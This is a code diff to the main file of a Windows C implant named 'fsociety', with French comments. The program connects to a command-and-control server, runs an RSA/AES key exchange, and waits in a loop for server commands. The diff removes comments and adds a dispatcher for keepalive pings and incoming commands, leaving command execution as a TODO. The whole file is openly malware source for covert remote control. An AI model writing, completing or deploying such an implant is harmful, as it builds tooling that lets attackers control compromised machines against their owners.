@@ -12,15 +12,15 @@
  * fsociety — Point d'entrée de l'implant
  * ============================================================ */
 
-/* État de session. */
 typedef struct {
     uint8_t aes_key[FSO_KEY_SIZE];
     int     established;
 } fso_session_t;
 
+static uint16_t g_seq = 0;
+
 static int send_keyx(fso_conn_t *conn, const fso_rsa_keypair_t *kp)
 {
-    /* Convertit la clé publique en DER. */
     uint8_t der[1024];
     size_t der_len = sizeof(der);
 
@@ -32,7 +32,6 @@ static int send_keyx(fso_conn_t *conn, const fso_rsa_keypair_t *kp)
 
     printf("[*] Clé publique DER : %zu octets\n", der_len);
 
-    /* Pack MSG_KEYX. */
     uint8_t packet[1200];
     int packet_len = fso_pack(MSG_KEYX, 0, der, (uint32_t)der_len,
                               packet, sizeof(packet));
@@ -41,7 +40,6 @@ static int send_keyx(fso_conn_t *conn, const fso_rsa_keypair_t *kp)
         return -1;
     }
 
-    /* Envoi. */
     if (fso_conn_send(conn, packet, (size_t)packet_len) < 0) {
         fprintf(stderr, "[-] Envoi MSG_KEYX échoué\n");
         return -1;
@@ -54,7 +52,6 @@ static int send_keyx(fso_conn_t *conn, const fso_rsa_keypair_t *kp)
 static int recv_auth(fso_conn_t *conn, const fso_rsa_keypair_t *kp,
                      fso_session_t *sess)
 {
-    /* 1. Lire exactement l'en-tête. */
     uint8_t hdr_buf[FSO_HEADER_SIZE];
     if (fso_conn_recv_exact(conn, hdr_buf, FSO_HEADER_SIZE) != FSO_HEADER_SIZE) {
         fprintf(stderr, "[-] Réception en-tête MSG_AUTH échouée\n");
@@ -75,7 +72,6 @@ static int recv_auth(fso_conn_t *conn, const fso_rsa_keypair_t *kp,
         return -1;
     }
 
-    /* 2. Lire exactement le payload chiffré. */
     uint8_t encrypted[2048];
     if (fso_conn_recv_exact(conn, encrypted, header.length) != (int)header.length) {
         fprintf(stderr, "[-] Réception payload MSG_AUTH échouée\n");
@@ -84,14 +80,13 @@ static int recv_auth(fso_conn_t *conn, const fso_rsa_keypair_t *kp,
 
     printf("[*] MSG_AUTH reçu (%u octets)\n", header.length);
 
-    /* 3. Déchiffrer la clé AES avec la clé privée RSA. */
     size_t aes_len = sizeof(sess->aes_key);
     if (fso_rsa_decrypt(kp->priv, kp->priv_len,
                         encrypted, header.length,
                         sess->aes_key, &aes_len) != FSO_CRYPTO_OK) {
         fprintf(stderr, "[-] Déchiffrement RSA échoué\n");
         return -1;
-                        }
+    }
 
     if (aes_len != FSO_KEY_SIZE) {
         fprintf(stderr, "[-] Taille clé AES invalide : %zu\n", aes_len);
@@ -115,13 +110,11 @@ int main(int argc, char **argv)
     if (argc >= 2) host = argv[1];
     if (argc >= 3) port = (uint16_t)atoi(argv[2]);
 
-    /* Init crypto. */
     if (fso_crypto_init() != FSO_CRYPTO_OK) {
         fprintf(stderr, "[-] Init crypto échouée\n");
         return 1;
     }
 
-    /* Génération de la paire RSA. */
     printf("[*] Génération de la paire RSA...\n");
     fso_rsa_keypair_t kp;
     if (fso_rsa_generate(&kp) != FSO_CRYPTO_OK) {
@@ -130,13 +123,11 @@ int main(int argc, char **argv)
     }
     printf("[+] Paire RSA générée\n");
 
-    /* Init Winsock. */
     if (fso_conn_init() != 0) {
         fso_rsa_free(&kp);
         return 1;
     }
 
-    /* Connexion au C2. */
     fso_conn_t conn;
     if (fso_conn_connect(&conn, host, port) != 0) {
         fprintf(stderr, "[-] Échec connexion au C2\n");
@@ -145,7 +136,6 @@ int main(int argc, char **argv)
         return 1;
     }
 
-    /* Échange de clé. */
     fso_session_t sess;
     memset(&sess, 0, sizeof(sess));
 
@@ -160,8 +150,6 @@ int main(int argc, char **argv)
     }
 
     printf("\n[+] Session sécurisée active\n\n");
-
-    /* Boucle infinie : en attente de commandes. */
     printf("[*] En attente de commandes du C2...\n");
 
     uint8_t *payload = malloc(FSO_MAX_PAYLOAD);
@@ -180,12 +168,42 @@ int main(int argc, char **argv)
             break;
         }
 
-        printf("[C2] type=0x%02X seq=%u, %d octets\n",
-               header.type, header.seq_id, n);
+        /* ---------- Dispatch par type ---------- */
+        switch (header.type) {
 
-        if (n > 0) {
-            fwrite(payload, 1, (size_t)n, stdout);
-            printf("\n");
+        case MSG_PING: {
+            /* Répondre immédiatement avec un PONG. */
+            uint8_t pong_byte = 0x00;
+            if (fso_conn_send_secure(&conn, sess.aes_key, MSG_PONG,
+                                      g_seq++, &pong_byte, 1) < 0) {
+                fprintf(stderr, "[-] Envoi MSG_PONG échoué\n");
+            } else {
+                printf("[keepalive] MSG_PING reçu, PONG renvoyé\n");
+            }
+            break;
+        }
+
+        case MSG_PONG:
+            printf("[keepalive] MSG_PONG reçu\n");
+            break;
+
+        case MSG_CMD:
+            printf("[C2] commande reçue (%d octets)\n", n);
+            if (n > 0) {
+                fwrite(payload, 1, (size_t)n, stdout);
+                printf("\n");
+            }
+            /* TODO : exécuter la commande et renvoyer MSG_RESULT. */
+            break;
+
+        default:
+            printf("[C2] type=0x%02X seq=%u, %d octets\n",
+                   header.type, header.seq_id, n);
+            if (n > 0) {
+                fwrite(payload, 1, (size_t)n, stdout);
+                printf("\n");
+            }
+            break;
         }
     }
 
